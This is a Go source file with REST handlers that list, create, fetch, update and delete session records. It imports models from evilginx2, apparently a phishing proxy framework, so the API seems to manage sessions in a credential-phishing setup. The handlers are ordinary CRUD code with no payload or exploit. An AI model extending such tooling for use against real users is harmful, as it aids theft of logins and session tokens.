package api

import (
	"net/http"

	"github.com/gin-gonic/gin"
	"github.com/kgretzky/evilginx2/pkg/models"
)

func (h *Handlers) listSessions(c *gin.Context) {
	sessions, err := h.storage.ListSessions(c.Request.Context())
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	
	c.JSON(http.StatusOK, gin.H{"sessions": sessions})
}

func (h *Handlers) createSession(c *gin.Context) {
	var session models.Session
	if err := c.ShouldBindJSON(&session); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	
	err := h.storage.CreateSession(c.Request.Context(), &session)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	
	c.JSON(http.StatusCreated, session)
}

func (h *Handlers) getSession(c *gin.Context) {
	id := c.Param("id")
	
	session, err := h.storage.GetSession(c.Request.Context(), id)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Session not found"})
		return
	}
	
	c.JSON(http.StatusOK, session)
}

func (h *Handlers) updateSession(c *gin.Context) {
	id := c.Param("id")
	
	var session models.Session
	if err := c.ShouldBindJSON(&session); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	
	session.ID = id
	err := h.storage.UpdateSession(c.Request.Context(), &session)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	
	c.JSON(http.StatusOK, session)
}

func (h *Handlers) deleteSession(c *gin.Context) {
	id := c.Param("id")
	
	err := h.storage.DeleteSession(c.Request.Context(), id)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	
	c.JSON(http.StatusOK, gin.H{"message": "Session deleted successfully"})
}
